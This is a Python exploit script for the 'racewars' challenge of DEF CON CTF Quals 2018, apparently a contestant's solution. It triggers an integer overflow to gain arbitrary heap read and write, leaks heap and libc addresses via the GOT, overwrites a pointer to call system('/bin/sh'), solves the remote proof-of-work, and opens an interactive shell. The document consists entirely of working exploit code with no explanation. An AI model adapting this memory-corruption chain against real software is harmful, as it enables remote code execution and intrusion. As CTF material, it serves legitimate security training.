#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import commands

bin_file = './racewars'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'2f76febe.quals2018.oooverflow.io', 'port':31337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    conn.sendlineafter('CHOICE: ', '1')
    conn.sendlineafter('need?\n', str(0x100000000/0x20))

    conn.sendlineafter('CHOICE: ', '4')
    conn.sendlineafter('transmission? ', '1')

    conn.sendlineafter('CHOICE: ', '2')
    conn.sendline('1')

    conn.sendlineafter('CHOICE: ', '3')

    for i in range(1, 5):
        conn.sendlineafter('CHOICE: ', '1')
        conn.sendlineafter('CHOICE: ', str(i))
        conn.sendline(str(0xffff))

    addr_heap_base = leak(conn, 4, -0x10) - 0xc8
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_libc_main = leak(conn, 6, addr_got_main, addr_heap_base)
    libc.address = addr_libc_main - offset_libc_main
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    modify(conn, p64(addr_libc_system)+p64(addr_libc_str_sh), addr_heap_base+0x400, addr_heap_base)
    modify(conn, p64(addr_heap_base+0x400), addr_heap_base+0x50, addr_heap_base)

    conn.sendlineafter('CHOICE: ', '6')

def leak(conn, size, addr, heap=0):
    if heap > 0:
        heap += 0xa0

    data = 0
    for i in range(size-1, -1, -1):
        data <<= 8
        conn.sendlineafter('CHOICE: ', '4')
        conn.sendlineafter('modify? ', str(addr - heap + i))
        conn.recvuntil(' is ')
        data += int(conn.recvuntil(',', drop=True))
        conn.sendline('0')
        conn.sendline('0')
    return data

def modify(conn, data, addr, heap=0):
    if heap > 0:
        heap += 0xa0

    for i in range(0, len(data)):
        conn.sendlineafter('CHOICE: ', '4')
        conn.sendlineafter('modify? ', str(addr - heap + i))
        conn.sendline(str(ord(data[i])))
        conn.sendline('1')

def remote_pow(conn):
    conn.recvuntil('Challenge: ')
    challenge = conn.recvuntil('\n', drop=True)
    conn.recvuntil('n: ')
    n = int(conn.recvuntil('\n', drop=True))
    info('challenge: {}, n: {}'.format(challenge, n))

    solution = commands.getoutput('./pow {} {}'.format(challenge, n))
    info('solution: {}'.format(solution))
    conn.sendlineafter('Solution: \n', str(solution))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    if env.check('remote'):
        remote_pow(conn)
    attack(conn)
    conn.interactive()
    
#==========
